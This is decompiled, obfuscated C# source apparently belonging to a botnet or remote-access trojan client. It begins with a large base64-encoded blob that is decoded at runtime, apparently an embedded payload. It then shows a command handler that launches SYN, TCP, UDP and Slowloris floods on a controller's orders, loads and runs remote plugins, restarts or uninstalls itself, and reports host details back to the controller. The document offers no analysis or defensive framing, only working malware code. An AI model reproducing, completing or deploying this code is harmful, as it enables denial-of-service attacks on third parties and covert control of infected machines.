ZWWFZWVlgWVlZWdlZWVlZWVlZWVlZWVlZYVlZcWT19jXyGVlZeVoZWVlpWVlZWllZWWDZWVlZWVlZWVlZWVlZWWlZWWlk9fK0dTIZWVxZWVlZcVlZWVnZWVlh2VlZWVlZWVlZWVlZWVlpWVlp2VlZWVlZWVlZWVlZWVlZWXVn2VlZWVlZa1lZWVnZWplDYplZWV5ZWVmZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZbtnjXZlZW9lZWfYd2Vlb+JuZWVpZY9lZXiVaGW+ZWVlZmVldmXYeGVlb+VwZWVp2HllZW/lb2VlaeNvZWVp43BlZWln1HplZW9l43BlZWnUe2Vlb2XjcGVladR8ZWVvb+NwZWVp1H1lZW9leeVwZWVpeeVvZWVpa3CQZWyPZWVleJVnZbhlZWVnZWV2ZWfYfmVlb+VwZWVp2HllZW/lb2VlaeNvZWVp43BlZWnUf2Vlb9psZWVnb+NwZWVp1HtlZW9l43BlZWnUfWVlb2V55XBlZWl55W9lZWlrcJBlbI+DZ412ZWVvj2V4lWZlcGVlZWhlZXZn4HdlZWlvkGVrj4dnaOJ3ZWVpj3iVZmVwZWVlaWVldmfgeGVlaW+QZWuPh2do4nhlZWmPeJVoZa9lZWVqZWV2ZWeNgWVlb42CZWVvNXtlZWaNg2Vlb3zUhGVlb29r8857Y2d7Y2ZxbZJ7ZWt7/9l7ZWVm1IVlZW/YhmVlb3CQbeOHZWVvcJBlbI9vZY9lZWV4lWhllWVlZWtlZXZn4HFlZWlva3BsaI2IZWVv2XFlZWZxZ+FxZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HFlZWlva3BsaI2KZWVv2XFlZWZxZ+FxZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HJlZWlva3BsaI2IZWVv2XFlZWZxZ+FyZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HJlZWlva3BsaI2KZWVv2XFlZWZxZ+FyZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HNlZWlva3BsaI2IZWVv2XFlZWZxZ+FzZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWtlZXZn4HNlZWlva3BsaI2KZWVv2XFlZWZxZ+FzZWVpbWyNZmVlkG9rbGNme2Nmcm6SPY94lWhllWVlZWxlZXZn4HRlZWlva3BsaI2IZWVv2WhlZWdxZ+F0ZWVpbWyNZ2VlkG9rbGNme2Nmcm6SPY94lWhllWVlZWxlZXZn4HRlZWlva3BsaI2KZWVv2WhlZWdxZ+F0ZWVpbWyNZ2VlkG9rbGNme2Nmcm6SPY94lWhllWVlZW1lZXZn4HVlZWlva3BsaI2IZWVv2WdlZWdxZ+F1ZWVpbWyNaGVlkG9rbGNme2Nmcm6SPY94lWhllWVlZW1lZXZn4HVlZWlva3BsaI2KZWVv2WdlZWdxZ+F1ZWVpbWyNaGVlkG9rbGNme2Nmcm6SPY94lWhllWVlZW5lZXZn4HZlZWlva3BsaI2IZWVv2WllZWdxZ+F2ZWVpbWyNaWVlkG9rbGNme2Nmcm6SPY94lWhllWVlZW5lZXZn4HZlZWlva3BsaI2KZWVv2WllZWdxZ+F2ZWVpbWyNaWVlkG9rbGNme2Nmcm6SPY94lWhlqWVlZW9lZXZlaG9re5NnkIJn4HRlZWl5Y2ZwbJJzZ+B0ZWVpZ2nUa2Vla2WQgmfgdWVlaXljZnBsknNn4HVlZWlnadRnZWVrZZBlj3iVaGWCZWVlcGVldmVn4HZlZWl5Y2Zva5JzZ+B2ZWVpZ2jUb2Vla2WPZWVleJVoZYJlZWVwZWV2ZWfgcWVlaXljZm9rknNn4HFlZWlnedSLZWVvZY9lZWVolWhlrWVlZWVlZWVlZ+BxZWVpeXnUi2Vlb2Vn4HJlZWl5edSLZWVvZWfgc2VlaXl51ItlZW9lZ+B1ZWVpeXnUZ2Vla2Vn4HZlZWl5edRvZWVrZY+DZ412ZWVvj6e4r6dmZWZlZWVlZXFlZWXbl5OVk5qVnJecZWVlZWpl0WVlZWluZWWI42Vl1W5lZUVsZWWIuNnXztPM2GVlZWW1dmVlbWVlZYi6uGW9dmVldWVlZYisuq6pZWVlzXZlZf1nZWWIp9HUx2VlZWVlZWVnZWVmvIIbbm5tZWVlX4qYZXtlZWZlZWWKZWVlbmVlZXhlZWWXZWVllmVlZYtlZWVpZWVleGVlZXBlZWVmZWVla2VlZWZlZWVxZWVlf2VlZWZlZWVmZWVlZ2VlZWllZWVlZW9lZmVlZWVla2X7ZfRla2UNZfRla2USZfRla2UmZfRla2UzZfRla2WBZvRla2WsZpFma2XnZrhma2UEZvpma2XBZ/Rlb2XqZ9Vna2U+Z/Rla2VcaUppa2Vzakppa2WQakppa2Wvakppa2XIakppa2Xhakppa2X8akppa2UXakppa2VPajBqa2VjajBqa2Vxa0ppa2WKa0ppa2W6a6drzGXOa2Vla2X9a91ra2Uda91ra2U7a/Rla2VRa/pma2VubN1ra2WJbPRla2WWbEppa2WrbPRla2XzbPRla2UVbARsa2U4bPRlZWVlZWZlZWVlZWZlZmVmZmVle2WOZWplZmVmZWZmZWWVZY5lamVmZWplZmZlZadljmVqZWZlbmVmZmVlvGWOZW5lZmVyZWZmZWXIZY5lbmVpZXJlZoV1Zc1ljmVyZWxlcmVmZXVl2GWOZXJlb2VzZeZldWXjZY5lcmVxZXZla2tXZY9lu+VfZZJlu+VkZZJla2tXZY9lu+VsZqBlu+VzZqBla2V6ZqRla2WGZqdla2WzZqtldmX3ZrZldmURZrplZmVLZwNlZmWMaANlZmWvaANlZmXSaA1lZmXvaBdlZmUPaCFlZmVQaDNlZmVzaTdlZWVlZWhl630ZZW9lZmVlZWVlaGUrZh9ldWVoZWVlZWVoZStmQWV9ZWplZWVlZWhlK2ZNZYllbmVlZWVlaGXrfRllb2VvZWVlZWVoZStmH2V1ZXFlZWVlZWhlK2ZBZX1lc2VlZWVlaGUrZk1liWV3ZWVlZWVoZet9GWVvZXhlZWVlZWhlK2YfZXVlemVlZWVlaGUrZkFlfWV8ZWVlZWVoZStmTWWJZYBltYVlZWVl630ZZbJlgWXNhWVlZWX7ZRRmvmWBZTWFZWVlZftlHmbFZYJllIZlZWVl630ZZbJlg2VlZWVlZWUrcipmzGWDZWVlZWVlZStyM2bMZYNlZWVlZWVlK3JDZsxlg2VlZWVlZWUrck5m0GWDZWVlZWVlZStyX2bVZYNlZWVlZWVlK3J3Z9Vlg2VlZWVlZWUrcoln1WWDZZ2GZWVlZettlWfZZYNltIZlZWVl622rZ95lg2VlZWVlZWUrcsln5GWEZWVlZWVlZSty72fpZYRlvYZlZWVl6239Z+5lhGXUhmVlZWXrbQ1n8mWEZd2GZWVlZettHWf3ZYVlZWVlZWVlK2omZ7JlhWVlZWVlZWUrajFn/GWFZTOGZWVlZStmOWfyZYdlOYZlZWVl621dZwdliGV1h2VlZWXrbXNoB2WJZbGHZWVlZettlGgHZYpl7YdlZWVl622gaAdli2Uph2VlZWXrbbdoB2WMZWWIZWVlZettw2gHZY1loYhlZWVl623YaBFljmXdiGVlZWXrbeJoEWWPZRmIZWVlZett9mgbZZBlVYhlZWVl620BaBtlkWWRiWVlZWXrbRhoJWWSZc2JZWVlZettJWglZZNlCYllZWVl62U1aCtllGVZiWVlZWXrZTpo3mWWZYWKZWVlZetlRWiyZZdlsYplZWVl5mVOaLJll2UFimVlZWXpfRllsmWXZWVlZmUHaWVlZ2UOaWVlZmUVaWVlZ2VOaGVlZmUVaWVlZ2VOaGVlaGUcaWVlaWUHaWVlZmUlaWVlZmUHaWVlZ2UOaWVlZmUVaWVlZ2VOaGVlZmUVaWVlZ2VOaGVlaGUcaWVlaWUHaWVlZmUlaWVlZmUHaWVlZ2UOaWVlZmUVaWVlZ2VOaGVlZmUVaWVlZ2VOaGVlaGUcaWVlaWUHaWVlZmUlaWVlZmUsaWVlZmUxaWVlZmUzaWVlZmUzaWVlZmU5aWVlZ2VOaGVlZmU5aWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmUzaWVlZmVFaWVlZ2VOaGVlZmVOaM5lGWVfZdZlGWVfZd5lGWVfZeZlGWVfZe5lGWVfZfZlGWVfZf5lGWVfZQZlGWVfZQ5lGWVkZRZlGWVfZR5lGWVfZSZlGWVfZS5lGWVpZj5lGWVvZkZlGWWyZU5lGWWyZX5lGWWyZXFlGWWyZa5lGWWyZaZlGWWyZaZlFGZ6ZlZlWGuyZa5lXmuBZlZlZmyyZa5lGWWNZqZlHmaTZl5lGWWyZX5ljmypZm5mn2yvZmZmvWy4Zm5mz2zBZhZl42zMZZZlGWVfZZZl7WynZX5m/GzSZoZmIWzeZn5mMWzSZsZlH2UxZm1lbWWWZW1lcWWbZW1leWWWZW1lfWWbZZNliGVmZ5Nl4GXbZ5NlmGVzZ5Nl2GXSZ5NlcGU5ZpNleGVFZpNlgGVgZpNlkGU5ZpNloGVgZpNlsGVgZpNluGWSZ5NlyGW8Z5Nl0GXJZ6ZnQGWbZcZnQGWbZWVoQGWbZYVoQGWbZeVoQGWbZQVoQGWbZYZmmWagZqVmymbwZv9mDmYdZidmLWZuZWZlZWVLZ5ZlZWWMaJZlZWWvaJZlZWXSaHFlZWXvaG1lZWUPaHVlbmVmZWVlkGk6ZWVllWk6ZWVloWk6ZWVlqGk+ZWVltWlDZWVlyWlDZWVl12lDZWVl32lHZWVlwWdMZWVl8WlRZWVl+2lWZWVlgWZaZXVliGVnZW1lh2VnZWdldmVoZXVlimVpZW1liWVpZWdld2VqZW1li2VrZXVljGVrZWdleGVsZXVljmVtZW1ljWVtZWdleWVuZXVlkGVvZW1lj2VvZWdlemVwZXVlkmVxZW1lkWVxZWdle2VyZWdlfGV0ZWdlfWV2ZWZlfmV2ZWdlf2V4ZWdlgGV6ZWZlgmV8ZWdlgWV8ZWdlg2V+ZXRmaeVlZWZlZWVlZWVlZWVlZWVl42VlZWdlZWVlZWVlZWVlZWZl62VlZWVlZ2VlZWVlZWVlZWVlZmXVZ2VlZWWuZetmrmX6Zq5lCWauZRhmZWVlobLUydrRyqNlrrXR2szO05PJ0dFltNrZ1drZqtvK09mtxtPJ0crXZbXR2szO02Wu09Xa2arbytPZrcbTydHK12W3ysjKztvKyarbytPZrcbTydHK12W10drMztO42cbZymW4zsnKZbXR2szO06bXzNhluMrXzsbRzt/K12WutdHazM7TZdLYyNTX0c7HZbje2NnK0mWy2tHZzsjG2NmpytHKzMbZymWq09rSZbTHz8rI2WWTyNnU12Wu09vU0MplrqbY3tPIt8rY2tHZZabY3tPIqMbR0cfGyNBlp8rMztOu09vU0MplZdfjP6rTya7T29TQymXbxtHaysTEZbO0s6plt7qzs66zrGWosa6qs7lluKq3u6q3Za3KxsnK12Ws2s7JZbXR2szO06zazslluN7Y2crSk6jU0dHKyNnO1NPYk6zK08rXzshlsc7Y2cWWZanG2cZluN7Y2crSk7fa09nO0sqTuMrXzsbRzt/G2c7U05Or1NfSxtnZytfYk6fO08bX3mWnztPG196r1NfSxtnZytdlx8tluN7Y2crSk660ZbLK0tTX3rjZ18rG0mXS2GW4ytfOxtHO38plqcrYytfOxtHO38plzMrZxLPG0splzMrZxKnK2MjXztXZztTTZczK2cSm2tnN1NdlzMrZxKja19fK09m42cbZymXMytnEuNnU1bTTqc7YyNTT08rI2c7U02XMytnEqt3KyNrZyrTTsdTGyWXMytnErcbYq9TX0mXMytnEqt3KyNrZyrTTsdTGyabXzNhl2MrZxKrdysja2cq007HUxsmm18zYZbvK19jO1NNlzMrZxLvK19jO1NNluN7Y2crSk7zO08nU3NiTq9TX0thlq9TX0mXMytnErtPV2tmr1NfSZczK2cS42cbZyrTHz8rI2WXYytnEuNnG2cq0x8/KyNllzMrZxKzazsllrtPO2c7G0c7fymWq3crI2tnKZbjZ1NVlqtvK09mtxtPJ0crXZardysja2c7U06jU0tXRytnKZcbJycSq3crI2tnO1NOo1NLV0crZymXXytLU28rEqt3KyNrZztTTqNTS1dHK2cpluNnG19nKyWXGycnEuNnG19nKyWXXytLU28rEuNnG19nKyWW42dTV1crJZcbJycS42dTV1crJZdfK0tTbysS42dTV1crJZa7T1drZZcbJycSu09Xa2WXXytLU28rErtPV2tlltNrZ1drZZcbJycS02tnV2tll18rS1NvKxLTa2dXa2WW3ysjKztvKyWXGycnEt8rIys7bysll18rS1NvKxLfKyMrO28rJZbjK08lltNO3ysjKztvKyWWq3crI2tnKyWXKZaGq3crI2tnKtNOx1MbJptfM2KPQxMSnxsjQztPMq87K0cllobjZxtnKtMfPysjZo9DExKfGyNDO08yrzsrRyWWzxtLKZanK2MjXztXZztTTZaba2c3U12Wo2tfXytPZuNnG2cpluNnU1bTTqc7YyNTT08rI2c7U02Wq3crI2tnKtNOx1MbJZa3G2KvU19Jlqt3KyNrZyrTTsdTGyabXzNhlrtPV2tmr1NfSZbjZxtnKtMfPysjZZdTHz8rI2WXSytnN1Mll2MrTycrXZcjG0dHHxsjQZdfK2NrR2WXG18zYZcdl28bR2spl2NnG2cq0x8/KyNll2M7JymW43tjZytKTt8rL0crI2c7U02Wm2NjK0sfR3rnO2dHKptnZ187H2tnKZabY2MrSx9HeqcrYyNfO1dnO1NOm2dnXzsfa2cplptjYytLH0d6o1NPLzsza18bZztTTptnZ187H2tnKZabY2MrSx9HeqNTS1cbT3qbZ2dfOx9rZymWm2NjK0sfR3rXX1MnayNmm2dnXzsfa2cplptjYytLH0d6o1NXe187Mzdmm2dnXzsfa2cplptjYytLH0d6518bJytLG19Cm2dnXzsfa2cplptjYytLH0d6o2tHZ2tfKptnZ187H2tnKZbje2NnK0pO32tPZztLKk67T2crX1NW4ytfbzsjK2GWo1NK7ztjOx9HKptnZ187H2tnKZazazsmm2dnXzsfa2cplptjYytLH0d67ytfYztTTptnZ187H2tnKZabY2MrSx9Heq87RyrvK19jO1NOm2dnXzsfa2cpluN7Y2crSk6nOxszT1NjZzsjYZanKx9rMzMbH0cqm2dnXzsfa2cplqcrH2szMztPMstTJythluN7Y2crSk7fa09nO0sqTqNTS1c7Ryte4ytfbzsjK2GWo1NLVztHG2c7U07fK0cbdxtnO1NPYptnZ187H2tnKZbfa09nO0sqo1NLVxtnOx87RztneptnZ187H2tnKZbjK187G0c7fxsfRyqbZ2dfOx9rZymW42dfKxtJlqNHU2MpludSm19fG3mWpztjV1NjKZajU0tXO0crXrMrTytfG2crJptnZ187H2tnKZbne1cplrMrZud7VymWm2NjK0sfR3mWsytmm2NjK0sfR3mW32tPZztLKud7Vyq3G08nRymWsytm53tXKq9fU0q3G08nRymWsytmo2tjZ1NKm2dnXzsfa2crYZczK2cS7xtHaymWq0tXZ3mWpytHKzMbZymWo1NLHztPKZbje2NnK0pO5zdfKxsnO08xlrtPZytfR1MjQysllqNTS1cbXyqrdyM3G08zKZbfK0tTbymWq28rT2abXzNhlZWVlZWiFZWVlZWU5ghRJszUPpv2EEInNkpunZW0c38G7fplF7mqFZ2aBfWyFZ2Z3iXeBcIVpd3Z3iXeBd3qBaoVmZnd2Z2ttaGt2eWllZWVlaWZlZWVoa3Z9Z2tzaGt2fmtreneCZoFohWVmaGt3hmhrd4prZWaCaneBa2Vmd4GCamiFZXNphWV2eWiFZWdphWV3gWqFZmZ3gWmFZXeOaYVld5JohWWBaYVmZoFphWV2fmuFZ2aBd4Foa3eWaoVmZneWaGt3cWqFZmZ3cWhrd21qhWZmd21oa3d1aoVmZnd1bIVnZnZ9d4Foa3eBZ2uBaI1lc2mNZXZ5aI1lZ2mNZXeBaY1ld45pjWV3kmiNZYFpjWV2fmmFZmZzaYVmZmdqhWZmds5phWZmbWp6d4JmgWuFZ2Z33oFphWWCamtsZ4JqgmpqhWZmgmpqhWaBd95rbGd3gXeBaWxmd4FobGaBaoVld+XmbWVmd+Xqd+XmbWVmd+XmduXubYVngoF35eZnbGxogoF2fmdwZWd35fJ35fJ35fJxdWZog2V1g2WDZYNlaW9md5ZubGl3lneWd5ZnaW9md3FubGl3cXdxd3FnaW9md21ubGl3bXdtd21naW9md3VubGl3dXd1d3Vnamxndn1naGxmZ2yFZ2aBd+X6cGZla7XR2szO02Vlf2ZlerPK2ZK8ysbbyoW10drMztOFp8bYymVlamZlZWVlcWZlbN24ztHK09llZYNmZX6o1NXe187MzdmFJw6F3bjO0crT2YWXlZaWZWWOZmWJnJibxpnKlZqSyMeeypKZx5rLkp7JyZqSl8bIm57Ky8iVyZ6eZWVxZmVslpOVk5WTlWVlbWZlbGZlZWVlbWZlbWVlZWVlg2ZlZmW5Z3u818bVs9TTqt3IytXZztTTuc3X1NzYZmVlZWVlZWWgM/GzZWVlZWdlZWXfZWVlKZ5lZSmAZWW3uKm41dztI1/RZbLoGXJwyY/YFmdlZWWon8G62MrX2MGzxtnNxtPBqdTI2tLK09nYwbvO2NrG0YW42drJztSFl5WWlcG119TPysjZ2MG119TPysjZhamp1LjK18G10drMztPB1MfPwanKx9rMwa610drMztOT1cnHZWVlzZ9lZWVlZWVlZWVl459lZWWFZWVlZWVlZWVlZWVlZWVlZWVlZWVlZdWfZWVlZWVlZWXEqNTXqdHRssbO02XS2MjU18rKk8nR0WVlZWVlZIplhaVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZmV1ZWVlfWVl5WVlZWVlZWVlZWVlZWVlZmVmZWVllWVl5WVlZWVlZWVlZWVlZWVlZmVlZWVlrWVlZb2lZWWJaGVlZWVlZWVlZWWJaJllZWW7ZbhlxGW7Zaplt2W4Za5ltGWzZcRlrmWzZatltGVlZWVlImlUY2VlZmVlZWZlZWVlZWVlZmVlZWVlpGVlZWVlZWVpZWVlZ2VlZWVlZWVlZWVlZWVlZallZWVmZbtlxmXXZatlzmXRZcplrmXTZctl1GVlZWVliWVpZWVluWXXZcZl02XYZdFlxmXZZc5l1GXTZWVlZWVlZRVp6WdlZWZluGXZZddlzmXTZcxlq2XOZdFlymWuZdNly2XUZWVlxWdlZWZllWWVZZVllWWVZZllx2WVZWVlqWV7ZWZlqGXUZdJl0mXKZdNl2WXYZWVls2XKZdllkmW8ZcplxmXbZcplhWW1ZdFl2mXMZc5l02WFZadlxmXYZcplZWWVZW1lZmWoZdRl0mXVZcZl02XeZbNlxmXSZcplZWVlZd1luGXOZdFlymXTZdllZWWdZWxlZmWrZc5l0WXKZallymXYZchl12XOZdVl2WXOZdRl02VlZWVltWXRZdplzGXOZdNlZWVlZZVlbWVmZatlzmXRZcplu2XKZddl2GXOZdRl02VlZWVllmWTZZVlk2WVZZNllWVlZZ1lcWVmZa5l02XZZcpl12XTZcZl0WWzZcZl0mXKZWVlrmW1ZdFl2mXMZc5l02WTZcll0WXRZWVlvWV+ZWZlsWXKZcxlxmXRZahl1GXVZd5l12XOZcxlzWXZZWVlqGXUZdVl3mXXZc5lzGXNZdllhWUOZYVl3WW4Zc5l0WXKZdNl2WWFZZdllWWWZZZlZWVlZaVlcWVmZbRl12XOZcxlzmXTZcZl0WWrZc5l0WXKZdNlxmXSZcplZWWuZbVl0WXaZcxlzmXTZZNlyWXRZdFlZWWVZWxlZmW1Zddl1GXJZdplyGXZZbNlxmXSZcplZWVlZbVl0WXaZcxlzmXTZWVlZWWZZW1lZmW1Zddl1GXJZdplyGXZZbtlymXXZdhlzmXUZdNlZWWWZZNllWWTZZVlk2WVZWVlnWVtZWZlpmXYZdhlymXSZcdl0WXeZYVlu2XKZddl2GXOZdRl02VlZZZlk2WVZZNllWWTZZVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVllWVlcWVlZfWfZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZQ==", bool_0: true)));
	}

	private static void smethod_7(string string_1)
	{
	}

	private static void smethod_8(object sender, EventArgs2 e)
	{
		//IL_045d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Invalid comparison between Unknown and I4
		Class14 @class = sender as Class14;
		try
		{
			Class13 class2 = new Class13(e.Byte_0);
			switch (e.Enum3_0)
			{
			case Class14.Enum3.const_1:
				if (Class9.Boolean_0)
				{
					@class.method_9(Class9.String_0 + " Flood Already Active");
					return;
				}
				Class9.smethod_0(Class9.Enum2.const_1, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class9.smethod_1();
				@class.method_9("SYN Flood Active");
				break;
			case Class14.Enum3.const_2:
				if (Class9.Boolean_0)
				{
					@class.method_9(Class9.String_0 + " Flood Already Active");
					return;
				}
				Class9.smethod_0(Class9.Enum2.const_0, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class9.smethod_1();
				@class.method_9("TCP Flood Active");
				break;
			case Class14.Enum3.const_3:
				if (Class9.Boolean_0)
				{
					@class.method_9(Class9.String_0 + " Flood Already Active");
					return;
				}
				Class9.smethod_0(Class9.Enum2.const_2, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class9.smethod_1();
				@class.method_9("UDP Flood Active");
				break;
			case Class14.Enum3.const_4:
				if (Class9.Boolean_0)
				{
					Class9.smethod_2();
					@class.method_9(Class9.String_0 + " Flood Inactive");
				}
				else
				{
					@class.method_9("No Flood Active");
				}
				break;
			case Class14.Enum3.const_5:
			{
				object[] parameter2 = new object[2]
				{
					class2.ReadString(),
					sender
				};
				new Thread(smethod_16).Start(parameter2);
				break;
			}
			case Class14.Enum3.const_6:
			{
				object[] parameter = new object[3]
				{
					class2.ReadString(),
					class2.ReadString(),
					sender
				};
				new Thread(smethod_17).Start(parameter);
				break;
			}
			case Class14.Enum3.const_7:
				try
				{
					Class8.smethod_1();
					@class.method_10(bool_2: false);
					Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
					Process.GetCurrentProcess().Kill();
				}
				catch
				{
					(sender as Class14).method_9("Restart Failed");
				}
				break;
			case Class14.Enum3.const_8:
			{
				string @string = Encoding.Default.GetString(e.Byte_0);
				if (@string != Encoding.Default.GetString(Class0.smethod_1(Convert.FromBase64String(Class3.string_10), bool_0: false)))
				{
					(sender as Class14).method_9("Invalid password");
					return;
				}
				if (Class3.bool_0)
				{
					foreach (GClass2 item in list_0)
					{
						item.method_3();
					}
					Class1.smethod_4();
				}
				Process.GetCurrentProcess().Kill();
				break;
			}
			case Class14.Enum3.const_9:
				try
				{
					if (GClass0.smethod_3(Encoding.GetEncoding(1252).GetBytes(class2.ReadString())))
					{
						string text = GClass0.sortedList_1.Values[GClass0.sortedList_1.Count - 1].get_Name() + " Stored";
						if (Class3.bool_0)
						{
							text += " and Saved";
							GClass0.smethod_0();
						}
						@class.method_9(text);
						break;
					}
					throw new Exception(GClass0.smethod_6());
				}
				catch (Exception)
				{
					@class.method_9("Plugin Error: Invalid or Already Loaded");
				}
				break;
			case Class14.Enum3.const_10:
				try
				{
					PluginArgs val = Serializer.Deserialize(e.Byte_0);
					if (!GClass0.sortedList_1.ContainsKey(val.PluginGuid))
					{
						@class.method_9("Plugin not found");
						break;
					}
					IPlugin iplugin_ = GClass0.sortedList_1[val.PluginGuid];
					GClass0.smethod_7(sender, iplugin_, val);
				}
				catch (Exception ex)
				{
					@class.method_9("Failed Plugin Execution: " + ex.Message);
				}
				break;
			case Class14.Enum3.const_11:
				try
				{
					Guid guid = new Guid(class2.ReadString());
					for (int i = 0; i < GClass0.sortedList_1.Count; i++)
					{
						if (GClass0.sortedList_1.Keys[i] == guid && (int)GClass0.sortedList_1.Values[i].get_CurrentState() == 1)
						{
							GClass0.sortedList_1.Values[i].Stop(sender);
							break;
						}
					}
				}
				catch
				{
					@class.method_9("Failed to stop plugin");
				}
				break;
			case Class14.Enum3.const_13:
				bool_0 = true;
				break;
			case Class14.Enum3.const_17:
				@class.method_10(bool_2: true);
				break;
			default:
				@class.method_9("Broken\\Invalid Header");
				break;
			case Class14.Enum3.const_19:
				bool_1 = true;
				int_0 = BitConverter.ToInt32(e.Byte_0, 0);
				@class.method_10(bool_2: true);
				break;
			case Class14.Enum3.const_20:
				if (Class9.Boolean_0)
				{
					@class.method_9(Class9.String_0 + " Flood Already Active");
					return;
				}
				Class9.smethod_0(Class9.Enum2.const_3, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class9.smethod_1();
				@class.method_9("Slowloris Flood Active");
				break;
			}
			class2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_9(object sender, EventArgs e)
	{
		Class14 @class = (Class14)sender;
		Class11 class2 = new Class11();
		class2.Write(Class4.smethod_1());
		class2.Write(Class12.smethod_0());
		class2.Write(Class3.string_7);
		class2.Write(Class0.smethod_3(@class.String_1, bool_0: true));
		class2.Write(Class3.string_11);
		byte[] data = class2.method_0();
		@class.method_7(new Class6(Class14.Enum3.const_15, data).method_0());
		@class.method_3();
		Class10.smethod_0(@class);
		class2 = null;
		data = null;
	}

	private static void smethod_10(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		Class14 @class = (Class14)sender;
		Class10.smethod_1(@class);
		@class.method_11();
		if (bool_0)
		{
			Thread.Sleep(TimeSpan.FromSeconds(30.0));
			bool_0 = false;
		}
		else if (bool_1)
		{
			Thread.Sleep(TimeSpan.FromSeconds(int_0));
			int_0 = 0;
			bool_1 = false;
		}
		if (GClass0.sortedList_1.Count > 0)
		{
			foreach (IPlugin value in GClass0.sortedList_1.Values)
			{
				if ((int)value.get_CurrentState() == 1 && value.get_StopOnDisconnection())
				{
					value.Stop(sender);
				}
			}
		}
		@class.method_0();
	}

	private static void smethod_11(object sender, EventArgs0 e)
	{
	}

	private static void smethod_12(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class14).method_9(((IPlugin)((sender is IPlugin) ? sender : null)).get_Name() + ": Stopped");
			}
		}
		catch
		{
		}
	}

	private static void smethod_13(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class14).method_9(val.get_Name() + ": Started");
			}
		}
		catch
		{
		}
	}

	private static void smethod_14(IPlugin iplugin_0, PluginArgs pluginArgs_0)
	{
		try
		{
			pluginArgs_0.PluginGuid = iplugin_0.get_Guid();
			if (iplugin_0.get_StateObject() != null)
			{
				Class14 @class = iplugin_0.get_StateObject() as Class14;
				@class.method_7(new Class6(Class14.Enum3.const_12, Serializer.Serialize(pluginArgs_0)).method_0());
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("PLUGIN ERROR - Name: {0}, Error: {1}", iplugin_0.get_Name(), ex.Message);
			(iplugin_0.get_StateObject() as Class14).method_9(iplugin_0.get_Name() + ": Error");
		}
	}

	private static void smethod_15(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
